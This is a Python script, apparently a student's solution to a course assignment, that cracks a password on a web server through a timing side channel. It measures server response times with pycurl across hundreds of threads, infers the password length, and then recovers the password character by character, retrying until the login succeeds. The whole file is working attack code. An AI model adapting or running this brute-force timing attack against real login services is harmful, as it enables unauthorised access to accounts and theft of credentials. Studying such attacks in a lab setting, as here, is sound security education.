import urllib.parse
import time
import string
from Timer import ThreadSafeTimer
from concurrent.futures import ThreadPoolExecutor
from decimal import Decimal, getcontext
import pycurl
import io
import threading
from IPython.display import clear_output

_thread_local = threading.local()

### -------------------------- ###
### ---- Global Variables ---- ###
### -------------------------- ###
DIFFICULTY = 20

BASE_URL = "aoi-assignment1.oy.ne.ro"
SERVER_PORT = 8080

CHARSET = string.ascii_lowercase

USERNAME = "326529229" # need to recieve

# since threads wait for a long long time for I/O
# it is possible and wanted to have a lot of threads
NUMBER_OF_THREADS = 20*DIFFICULTY + 300

PASSWORD = ""
LENGTH = -1

getcontext().prec = 30

### ------------------------- ###
### --- get_curl_instance --- ###
### ------------------------- ###
def get_curl_instance():
    """
    Get a persistent curl instance for the current thread.
    This allows for connection reuse and avoids the overhead of creating
    a new curl object for each request.
    each thread will have its own instance of curl client.
    """
    if not hasattr(_thread_local, 'curl'):
        _thread_local.curl = pycurl.Curl()
        # Ensure connection reuse is allowed (default is reuse; explicit for clarity)
        _thread_local.curl.setopt(pycurl.FORBID_REUSE, 0)
        _thread_local.curl.setopt(_thread_local.curl.TIMEOUT, 4)
        _thread_local.curl.setopt(_thread_local.curl.CONNECTTIMEOUT, 5)
    return _thread_local.curl

### ------------------------- ###
### ----- try_password ------ ###
### ------------------------- ###
def try_pass(password):
    global USERNAME, DIFFICULTY, BASE_URL, SERVER_PORT
    params = {'user': USERNAME, 'password': password, 'difficulty': DIFFICULTY}
    query_string = urllib.parse.urlencode(params)
    url = f"http://{BASE_URL}:{SERVER_PORT}/?{query_string}"
    #url = f"http://127.0.0.1/?{query_string}"
    # Get persistent curl instance for this thread.
    c = get_curl_instance()
    buffer = io.BytesIO()
    c.setopt(c.URL, url)
    c.setopt(c.WRITEDATA, buffer)

    num_tries = 5
    success = False
    while num_tries > 0 and not success:
        try:
            c.perform()
            success = True
        except pycurl.error as e:
            errno, errstr = e.args
            num_tries -= 1
            if num_tries == 0:
                # Log the error or handle it as needed
                raise Exception(errstr)

    # PRETRANSFER_TIME: The time taken from the start until
    # just before the transfer begins (includes DNS, TCP handshake, etc.).
    pretransfer = c.getinfo(c.PRETRANSFER_TIME)
    # STARTTRANSFER_TIME: The time from the start until
    # the first byte is received from the server.
    starttransfer = c.getinfo(c.STARTTRANSFER_TIME)
    http_code = c.getinfo(c.RESPONSE_CODE)

    c.reset()

    server_time_sec = starttransfer - pretransfer
    time_ns = Decimal(server_time_sec) * Decimal(1e9)
    data = int(buffer.getvalue().decode('utf-8')) == 1

    return {"Status": http_code, "Reason": "", "Time": time_ns, "Data": data}


### ----------------------------- ###
### --- crack_password_length --- ###
### ----------------------------- ###
def crack_password_length():
    with ThreadPoolExecutor(max_workers=10) as executor:

      length_timer = ThreadSafeTimer(range(33),0.2)
      futures = []

      for i in range(10):
        for l in range(33):
          futures.append(executor.submit(try_length, l, length_timer))

      # Wait for all threads to complete
      # outside of the loop so that each round wont have to wait on
      # the previous one to finish
      for future in futures:
          future.result()
      return length_timer.get_max_mean_key()

def try_length(l, length_timer):
    # to warm up the connection
    try_pass("!")
    result = try_pass("a" * l)
    length_timer.record_time(l, result.get('Time'))


### ---------------------------- ###
### --- num of repetitions ----- ###
### ---------------------------- ###
def num_repetitions(discovered_length):
    """
    this function returns the number of repetitions needed for each char
    """
    global LENGTH
    # all times 1/internet speed slt
    # remember that discovered_length starts from zero
    return 10*DIFFICULTY*(discovered_length//2+1) + DIFFICULTY*DIFFICULTY*2

### -------------------------- ###
### ---- crack_next_char ----- ###
### -------------------------- ###
def crack_next_char(discovered_length, executor):
    global NUMBER_OF_THREADS, CHARSET
    # to warm up the connection
    try_pass("!")
    r = 1 if LENGTH - discovered_length == 1 else num_repetitions(discovered_length)
    char_timer = ThreadSafeTimer(CHARSET)
    futures = []
    for round in range(r):
        for c in CHARSET:
            futures.append(executor.submit(try_char, c, discovered_length, char_timer))
    # Wait for all threads to complete
    # outside of the loop so that each round wont have to wait on
    # the previous one to finish
    for future in futures:
        future.result()
    return char_timer.get_max_mean_key()



def try_char(chars, discovered_length, char_timer):
    global PASSWORD, LENGTH
    if LENGTH - discovered_length == 1:
        for char in chars:
            result = try_pass(PASSWORD + char + "a" * (LENGTH-discovered_length-1))
            if result.get("Data"):
                char_timer.record_time(char, result.get("Time"))
    else:
        for char in chars:
            result = try_pass(PASSWORD + char + "a" * (LENGTH-discovered_length-1))
            char_timer.record_time(char, result.get("Time"))




### ------------------------- ###
### ---- main --------------- ###
### ------------------------- ###
def main():
    global PASSWORD, LENGTH, NUMBER_OF_THREADS

    correct = False
    while not correct:
      print("...Cracking Password..." , end="\n\n")
      print("Password - " , end="")
      try:
        # first step - exploit the server's length validation
        LENGTH, time_for_length = crack_password_length()
        # second step - crack the password char by char
        discovered_length = 0
        char_times = []
        with ThreadPoolExecutor(max_workers=NUMBER_OF_THREADS) as executor:
            while len(PASSWORD) < LENGTH:
                ch, t = crack_next_char(discovered_length, executor)
                PASSWORD += ch
                discovered_length += 1
                char_times.append(t)
                print(ch, end="")
        correct = try_pass(PASSWORD).get('Data')
        if not correct:
          print("\nGENERATED PASSWORD IS INCORRECT, trying again...")
          time.sleep(3)
          clear_output()
      except Exception as e:
        print(f"\n[ERROR] Connection reset by the server - {e}")
        print("trying again...")
        time.sleep(3)
        clear_output()


if __name__ == '__main__':
    main()
